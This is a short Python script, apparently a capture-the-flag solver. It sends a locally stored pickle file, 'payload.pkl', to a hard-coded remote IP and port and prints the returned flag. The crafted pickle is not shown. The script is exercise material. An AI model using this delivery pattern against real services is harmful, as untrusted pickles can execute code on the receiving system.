import socket

HOST = "13.71.17.243"
PORT = 9045

with open("payload.pkl", "rb") as f:
    data = f.read()

s = socket.socket()
s.connect((HOST, PORT))
s.sendall(data)

# read response (the flag)
response = s.recv(4096)
print(response.decode(errors="ignore"))
